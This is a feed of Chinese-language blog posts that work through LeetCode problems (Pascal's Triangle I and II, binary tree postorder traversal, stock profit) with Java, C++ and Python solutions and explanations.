profit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProfit</span><span class="params">(self, prices)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type prices: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> len(prices) &lt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        buy = prices[<span class="number">0</span>]</span><br><span class="line">        profit = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(prices)):</span><br><span class="line">            <span class="keyword">if</span> prices[i]-buy&gt;profit:</span><br><span class="line">                profit = prices[i]-buy</span><br><span class="line">            <span class="keyword">elif</span> prices[i]&lt;buy:</span><br><span class="line">                buy = prices[i]</span><br><span class="line">        <span class="keyword">return</span> profit</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这个是比较简单的动态规划问题了，动态规划在于动态规划数组的设置意义，它是用来存储什么意义的值的，这个一定要想清楚。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Array</tag>
        <tag>最长公共子序列（LCS）</tag>
        <tag>DP(动态规划)</tag>
      </tags>
  </entry>
  <entry>
    <title>119. Pascal&#39;s Triangle II</title>
    <url>/2017/06/01/119-Pascal-s-Triangle-II/</url>
    <content><![CDATA[<p>Given an index k, return the kth row of the Pascal’s triangle.</p>
<p>For example, given k = 3,<br>Return <code>[1,3,3,1]</code>.</p>
<p><strong>Note:</strong></p>
<p>Could you optimize your algorithm to use only O(k) extra space?</p>
<a id="more"></a>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p><strong>通过上层来计算当前行</strong>，这个解法就是118. Pascal’s Triangle的解法。</p>
<p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/pascals-triangle-ii</span></span><br><span class="line"><span class="comment"> * Beats : 100%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PascalsTriangleII4</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">getRow</span><span class="params">(<span class="keyword">int</span> rowIndex)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;rowIndex;i++)&#123;</span><br><span class="line">            list.add(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;list.size()-<span class="number">1</span>;j++)&#123;</span><br><span class="line">                list.set(j,list.get(j)+list.get(j+<span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/pascals-triangle-ii</span></span><br><span class="line"><span class="comment"> * Beats : 100%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; getRow(<span class="keyword">int</span> rowIndex) &#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= rowIndex; i++)&#123;</span><br><span class="line">			result.push_back(<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = result.size() - <span class="number">2</span>; j &gt; <span class="number">0</span>; j--)&#123;</span><br><span class="line">				result[j] += result[j - <span class="number">1</span>];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getRow</span><span class="params">(self, rowIndex)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type rowIndex: int</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,rowIndex+<span class="number">1</span>):</span><br><span class="line">            result.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(result)<span class="number">-2</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">                result[j] = result[j]+result[j<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><blockquote>
<p>其实这个计算是有公式的。</p>
</blockquote>
<h2 id="Calculating-a-row-or-diagonal-by-itself"><a href="#Calculating-a-row-or-diagonal-by-itself" class="headerlink" title="Calculating a row or diagonal by itself"></a><a href="https://en.wikipedia.org/wiki/Pascal%27s_triangle#Calculating_a_row_or_diagonal_by_itself" target="_blank" rel="noopener">Calculating a row or diagonal by itself</a></h2><blockquote>
<p>当前行的值可以通过，改之所在行和索引来计算。</p>
<p>k表示第k行，i表示该行的第i个元素。他们之间的关系有如下的公式：</p>
<p>$ C[k,i] = C[k,i-1] \times (k-i+1)\div i $</p>
<p>例如：k=5时</p>
<p>$ C[5,0] = 1$</p>
<p>$ C[5,1] = C[5,0] \times (5-1+1) \div 1 = 5$</p>
<p>$ C[5,2] = C[5,1] \times (5-2+1) \div 2 = 10$</p>
<p>……</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/pascals-triangle-ii</span></span><br><span class="line"><span class="comment"> * Beats : 100%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PascalsTriangleII</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">getRow</span><span class="params">(<span class="keyword">int</span> rowIndex)</span> </span>&#123;</span><br><span class="line">        Integer []rowarray = <span class="keyword">new</span> Integer[rowIndex+<span class="number">1</span>];</span><br><span class="line">        rowarray[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;rowarray.length;i++)&#123;</span><br><span class="line">            rowarray[i] = (<span class="keyword">int</span>)((<span class="keyword">long</span>)rowarray[i-<span class="number">1</span>]*(rowIndex+<span class="number">1</span>-i)/(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Arrays.asList(rowarray);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于这种Pascal’s Triangle（杨辉三角）类型的题目，如果想计算它，我们知道有两种方法：</p>
<ol>
<li>直接在一行首或尾加1，然后计算下一行。例如：1,2,1 —&gt; 1,2,1,1 —&gt; 1,3,3,1</li>
<li>根据$ C[k,i] = C[k,i-1] \times (k-i+1)\div i $，可以直接计算当前行，所根据的只是当前行号和当前行的元素索引，而不需要知道上一行的内容。</li>
</ol>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Array</tag>
        <tag>Pascal&#39;s Triangle(杨辉三角形)</tag>
      </tags>
  </entry>
  <entry>
    <title>118. Pascal&#39;s Triangle</title>
    <url>/2017/05/31/118-Pascal-s-Triangle/</url>
    <content><![CDATA[<p>Given numRows, generate the first numRows of Pascal’s triangle.</p>
<p>For example, given numRows = 5,</p>
<p>Return</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">     [<span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">   [<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>],</span><br><span class="line">  [<span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">1</span>],</span><br><span class="line"> [<span class="number">1</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">1</span>]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="暴力法"><a href="#暴力法" class="headerlink" title="暴力法"></a>暴力法</h2><blockquote>
<p>暴力法，不需要知道规律，只要根据输入，得出输出即可。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/pascals-triangle</span></span><br><span class="line"><span class="comment"> * Beats : 90%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PascalsTriangle</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; generate(<span class="keyword">int</span> numRows) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(numRows==<span class="number">0</span>) <span class="keyword">return</span> result;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        list.add(<span class="number">1</span>);</span><br><span class="line">        result.add(list);</span><br><span class="line">        <span class="keyword">while</span>(numRows&gt;<span class="number">1</span>)&#123;</span><br><span class="line">            list = generate(list);</span><br><span class="line">            result.add(list);</span><br><span class="line">            numRows--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">generate</span><span class="params">(List&lt;Integer&gt; list)</span></span>&#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                result.add(list.get(i-<span class="number">1</span>)+list.get(i));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                result.add(list.get(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        result.add(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><blockquote>
<p>找规律，发现，每次比上层多一个元素。规律也很容易发现，需要用循环解决。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/pascals-triangle</span></span><br><span class="line"><span class="comment"> * Beats : 100%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; generate(<span class="keyword">int</span> numRows) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ;i &lt; numRows; i++)&#123;</span><br><span class="line">            list.add(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = list.size()-<span class="number">2</span>;j &gt; <span class="number">0</span>;j--)&#123;</span><br><span class="line">                list.set(j,list.get(j)+list.get(j-<span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 这里为什么要new呢？因为Java和python都是将引用直接加进去的，所以结果是最后一次循环的结果的多次，因为他们并没有被复制，而是一个引用的多次</span></span><br><span class="line"><span class="comment">             * 比如：[[1,4,6,4,1],[1,4,6,4,1],[1,4,6,4,1],[1,4,6,4,1],[1,4,6,4,1]]</span></span><br><span class="line"><span class="comment">             * 不是我们希望的结果</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            result.add(<span class="keyword">new</span> ArrayList&lt;Integer&gt;(list));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/pascals-triangle</span></span><br><span class="line"><span class="comment"> * Beats : 100%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; generate(<span class="keyword">int</span> numRows) &#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">		<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; every;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numRows; i++)&#123;</span><br><span class="line">			every.push_back(<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = every.size() - <span class="number">2</span>; j &gt;= <span class="number">1</span>; j--)&#123;</span><br><span class="line">				every[j] += every[j - <span class="number">1</span>];</span><br><span class="line">			&#125;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 这里是很值得分析下的：可以看出vector是将引用的复制push进去的，而不是引用本身。</span></span><br><span class="line"><span class="comment">             * 这个是与Java和python很有区别的。</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">			result.push_back(every);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(self, numRows)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type numRows: int</span></span><br><span class="line"><span class="string">        :rtype: List[List[int]]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = []</span><br><span class="line">        list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,numRows):</span><br><span class="line">            list.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(list)<span class="number">-2</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">                list[i] = list[i]+list[i<span class="number">-1</span>]</span><br><span class="line">            <span class="string">"""注意这里和Java的原因一样"""</span></span><br><span class="line">            tmp = list[:]</span><br><span class="line">            res.append(tmp)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<blockquote>
<p>这里思路，很简单，实际操作可以多次尝试得出正确循环体，包括在list的前面加1，还是在最后加1都是正确的。</p>
<p>Java中<code>result.add(new ArrayList&lt;Integer&gt;(list));</code>和python中<code>res.append(tmp)</code>与</p>
<p>c++中<code>result.push_back(every);</code>相区别，c++对引用进行了复制后再添加，而Java和python则直接将索引添加，这导致了不同的结果。<code>需要特别注意！</code></p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<ol>
<li>寻找规律。</li>
<li>注意引用的复制问题。</li>
</ol>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Array</tag>
        <tag>Pascal&#39;s Triangle(杨辉三角形)</tag>
      </tags>
  </entry>
  <entry>
    <title>145. Binary Tree Postorder Traversal</title>
    <url>/2017/05/19/145-Binary-Tree-Postorder-Traversal/</url>
    <content><![CDATA[<p>Given a binary tree, return the postorder traversal of its nodes’ values.</p>
<p>For example:<br>Given binary tree <code>{1,#,2,3}</code>,</p>
<pre><code>1
 \
  2
 /
3
</code></pre><p>return <code>[3,2,1]</code>.</p>
<p><strong>Note</strong>: Recursive solution is trivial, could you do it iteratively?</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p><strong>使用递归(Recursion)</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreePostorderTraversal</span></span>&#123;</span><br><span class="line">    <span class="comment">// Using recursion！</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        postorderHelper(list,root);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postorderHelper</span><span class="params">(ArrayList&lt;Integer&gt; list, TreeNode node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        postorderHelper(list,node.left);</span><br><span class="line">        postorderHelper(list,node.right);</span><br><span class="line">        list.add(node.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span> </span>&#123;</span><br><span class="line"> <span class="keyword">int</span> val;</span><br><span class="line"> TreeNode left;</span><br><span class="line"> TreeNode right;</span><br><span class="line"> TreeNode(<span class="keyword">int</span> x) &#123; val = x; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p><strong>不使用递归(Without using recursion)</strong></p>
<blockquote>
<p>对于[1,2,3,4,5]</p>
</blockquote>
<pre><code>    1
   / \
  2   3
 / \   
4   5
</code></pre><p>我们发现，有后序遍历[4,5,2,3,1]，它的反转[1,3,2,5,4]，是一个遍历先右子树的先序遍历。那么就可以参考先序遍历的思路来解决！</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*for [1,2,3,4,5]</span></span><br><span class="line"><span class="comment">         1</span></span><br><span class="line"><span class="comment">        / \</span></span><br><span class="line"><span class="comment">       2   3</span></span><br><span class="line"><span class="comment">      / \   </span></span><br><span class="line"><span class="comment">     4   5</span></span><br><span class="line"><span class="comment">    We have [4,5,2,3,1]  ---&gt;  [1,3,2,5,4]</span></span><br><span class="line"><span class="comment">    It is the reverse of mid--&gt;right--&gt;left !</span></span><br><span class="line"><span class="comment">    So we can refer to the Binary Tree Preorder Traversal !</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreePostorderTraversal</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        TreeNode node = root;</span><br><span class="line">        <span class="keyword">while</span>(node!=<span class="keyword">null</span> || !stack.empty())&#123;</span><br><span class="line">            <span class="keyword">if</span>(node!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack.push(node);</span><br><span class="line">                list.add(<span class="number">0</span>,node.val);</span><br><span class="line">                node = node.right;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                TreeNode p = stack.pop();</span><br><span class="line">                node = p.left;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution3"><a href="#Solution3" class="headerlink" title="Solution3"></a>Solution3</h2><p><strong>不使用递归(Without using recursion)</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreePostorderTraversal</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        TreeNode node = root;</span><br><span class="line">        <span class="keyword">while</span>(node!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            list.add(<span class="number">0</span>,node.val);</span><br><span class="line">            <span class="keyword">if</span>(node.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack.push(node.left);</span><br><span class="line">            &#125;</span><br><span class="line">            node = node.right;</span><br><span class="line">            <span class="keyword">if</span>(node==<span class="keyword">null</span> &amp;&amp; !stack.empty())&#123;</span><br><span class="line">                node = stack.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution4"><a href="#Solution4" class="headerlink" title="Solution4"></a>Solution4</h2><p><strong>不使用递归(Without using recursion)</strong></p>
<blockquote>
<p>上面两种非递归的实现，大同小异，注意写法即可。但是上面的涉及一个思路，上面两种解法是基于先序遍历的思路，逆向过来的。而不是真正意义上的从上至下的遍历。要想从上至下的判断，需要考虑一个问题，因为根节点会在左孩子被访问后，再访问，但是，此时如果右孩子节点未被访问，则先访问右孩子节点。这里的判断需要注意。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreePostorderTraversal</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        TreeNode node  = root,pre = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(node!=<span class="keyword">null</span> || !stack.empty())&#123;</span><br><span class="line">            <span class="keyword">if</span>(node!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack.push(node);</span><br><span class="line">                node = node.left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                TreeNode p = stack.peek();</span><br><span class="line">                <span class="keyword">if</span>(p.right!=<span class="keyword">null</span> &amp;&amp; p.right!=pre)&#123;</span><br><span class="line">                    node = p.right;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                pre = p;</span><br><span class="line">                list.add(p.val);</span><br><span class="line">                stack.pop();</span><br><span class="line">                node = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参数pre不是很好理解，它的意义在于，防止避免造成向下访问的死循环，告知该节点已访问。</p>
<p>这里修改了了<a href="https://war3cdota.github.io/2017/05/19/112-Path-Sum/">112. Path Sum</a>后序遍历解法得到。</p>
</blockquote>
<h2 id="Solution5"><a href="#Solution5" class="headerlink" title="Solution5"></a>Solution5</h2><p><strong>Morris traversal</strong></p>
<blockquote>
<p>时间复杂度：O(n)<br>空间复杂度：O(1)</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreePostorderTraversal2</span></span>&#123;</span><br><span class="line">    <span class="comment">// Morris Traversal !</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        TreeNode cur = root;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">                list.add(<span class="number">0</span>,cur.val);</span><br><span class="line">                cur = cur.left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                TreeNode pre = cur.right;</span><br><span class="line">                <span class="keyword">while</span>(pre.left!=<span class="keyword">null</span> &amp;&amp; pre.left!=cur)&#123;</span><br><span class="line">                    pre = pre.left;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(pre.left==<span class="keyword">null</span>)&#123;</span><br><span class="line">                    list.add(<span class="number">0</span>,cur.val);</span><br><span class="line">                    pre.left = cur;</span><br><span class="line">                    cur = cur.right;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    pre.left = <span class="keyword">null</span>;</span><br><span class="line">                    cur = cur.left;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>后序遍历的非递归思路有两种：</p>
<ol>
<li>根据先序遍历，利用数据结构，使用先序遍历的相同方法可以解决。</li>
<li>自上向下的遍历，但是可能在是否访问过该节点需要再做判断。</li>
<li>后序遍历的Morris Traversal借助先序遍历的思路。</li>
</ol>
</blockquote>
]]></content>
      <tags>
        <tag>recursion(递归)</tag>
        <tag>LeetCode-medium</tag>
        <tag>Post-Order Traversal(后序遍历)</tag>
        <tag>Morris Traversal</tag>
      </tags>
  </entry>
  <entry>
    <title>94. Binary Tree Inorder Traversal</title>
    <url>/2017/05/19/94-Binary-Tree-Inorder-Traversal/</url>
    <content><![CDATA[<p>Given a binary tree, return the inorder traversal of its nodes’ values.</p>
<p>For example:<br>Given binary tree [1,null,2,3],</p>
<pre><code>1
 \
  2
 /
3
</code></pre><p>return [1,3,2].</p>
<p>Note: Recursive solution is trivial, could you do it iteratively?</p>
<a id="more"></a>
